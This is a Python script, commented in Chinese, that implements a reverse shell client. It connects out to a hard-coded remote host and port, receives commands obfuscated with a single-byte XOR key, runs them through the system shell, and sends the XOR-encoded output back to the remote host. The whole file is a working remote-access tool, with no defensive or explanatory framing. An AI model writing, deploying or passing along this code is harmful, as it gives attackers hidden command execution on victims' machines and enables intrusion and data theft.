import socket
import subprocess


# 定义一个函数用于对数据进行XOR编码/解码
def xor_bytes(data, key):
    """
     对给定的数据字节数组与指定的键值进行逐位异或操作。

     参数:
     data -- 要处理的字节数组
     key  -- 用于异或操作的单个字节键值

     返回:
     经过XOR处理后的新字节数组
     """
    return bytearray([b ^ key for b in data])


def execute_command(command_str):
    """
     执行命令并返回其标准输出和标准错误的组合。

     参数:
     command_str -- 要执行的命令字符串

     返回:
     命令执行的结果（包括stdout和stderr）作为字符串返回。
     如果发生异常，则返回异常信息。
     """
    try:
        # 使用 subprocess.run 来执行命令，允许shell解析，并捕获标准输出和标准错误
        result = subprocess.run(command_str, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        # 返回命令的标准输出和标准错误的组合
        return result.stdout + result.stderr
    except Exception as e:
        # 捕获任何可能发生的异常，并将其转换为字符串形式返回
        return str(e)


def main():
    """
     主函数，负责创建客户端套接字，连接到服务器，接收命令，执行命令，并发送结果。
     """
    RHOST = "192.168.203.234"  # 远程主机IP地址
    RPORT = 8000  # 远程主机端口号

    # 创建一个新的TCP/IP套接字对象
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # 尝试连接到远程服务器
        s.connect((RHOST, RPORT))
        print(f"Connected to {RHOST}:{RPORT}")

        while True:
            # 接收来自服务器的加密命令（最大1024字节）
            data = s.recv(1024)
            if not data:
                # 如果没有接收到任何数据，则退出循环
                break

            # 对接收到的数据进行解密，并尝试将其转换为UTF-8字符串
            en_data = xor_bytes(data, 0x41).decode('utf-8', errors='replace').strip()

            if not en_data:
                # 如果解密后的命令为空，则跳过本次循环
                continue

            print(f"Received command: {en_data}")  # 打印接收到的命令（调试用）

            # 执行解密后的命令
            output = execute_command(en_data)

            # 将命令执行的结果编码，并通过套接字发送回服务器
            en_STDOUT = xor_bytes(output.encode('utf-8'), 0x41)
            s.send(en_STDOUT)

    except Exception as e:
        # 捕获所有异常并打印错误信息
        print(f"An error occurred: {e}")
    finally:
        # 确保无论是否发生异常，都会关闭套接字
        s.close()
        print("Connection closed.")


if __name__ == "__main__":
    # 如果此脚本是直接运行的，则调用main函数开始执行
    main()